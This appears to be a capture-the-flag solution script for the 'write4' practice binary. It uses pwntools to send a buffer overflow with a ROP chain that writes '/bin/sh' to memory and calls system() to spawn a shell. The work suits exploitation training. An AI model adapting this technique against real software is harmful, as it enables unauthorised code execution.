#!/usr/bin/env python

from pwn import *

p = process("./write4")

p.recv(1024)

payload = (
    "\x90" * 40 +
    p64(0x400890) + # pop r14 ; pop r15 ; ret
    p64(0x601050) + # .data
    "/bin/sh\x00" +
    p64(0x400820) + # mov qword ptr [r14], r15 ; ret
    p64(0x400893) + # pop rdi ; ret
    p64(0x601050) + # /bin/sh
    p64(0x4005e0) # system@plt
)

p.sendline(payload)
p.interactive()

p.close()
